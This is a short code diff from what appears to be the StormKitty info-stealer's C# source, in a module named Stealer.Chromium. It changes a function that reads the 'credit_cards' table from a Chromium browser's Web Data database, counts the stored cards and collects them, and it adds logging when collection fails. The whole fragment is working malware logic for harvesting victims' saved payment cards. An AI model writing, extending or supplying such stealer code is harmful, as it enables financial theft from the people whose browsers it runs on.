@@ -11,14 +11,12 @@ namespace Stealer.Chromium
         /// <returns>List with credit cards</returns>
         public static List<CreditCard> Get(string sWebData)
         {
+            List<CreditCard> lcCC = new List<CreditCard>();
             try
             {
-                List<CreditCard> lcCC = new List<CreditCard>();
-
                 // Read data from table
                 SQLite sSQLite = SqlReader.ReadTable(sWebData, "credit_cards");
-                if (sSQLite == null)
-                    return lcCC;
+                if (sSQLite == null) return lcCC;
 
                 for (int i = 0; i < sSQLite.GetRowCount(); i++)
                 {
@@ -33,10 +31,9 @@ namespace Stealer.Chromium
                     Counter.CreditCards++;
                     lcCC.Add(cCard);
                 }
-
-                return lcCC;
             }
-            catch { return new List<CreditCard>(); }
+            catch (System.Exception ex) { StormKitty.Logging.Log("Chromium >> Failed collect credit cards\n" + ex); }
+            return lcCC;
         }
     }
 }
